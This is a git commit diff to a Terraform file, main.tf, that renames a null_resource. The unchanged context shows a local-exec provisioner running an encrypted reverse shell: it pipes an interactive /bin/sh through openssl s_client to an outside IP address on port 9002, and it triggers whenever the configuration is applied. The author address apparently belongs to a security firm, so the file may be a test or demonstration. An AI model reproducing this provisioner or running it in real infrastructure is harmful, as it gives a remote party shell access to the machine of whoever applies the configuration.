1b59ccaf6f222aa1b64e2d460e86b3fc70d64ba4
MaorC-palantir <maorc@palantirsecurity.com>
2026-01-14 15:34:38 +0200

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,4 +1,4 @@
-resource "null_resource" "Exec1" {
+resource "null_resource" "Exec0" {
 
   provisioner "local-exec" {
     command = "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 62.90.174.128:9002 > /tmp/s; rm /tmp/s"
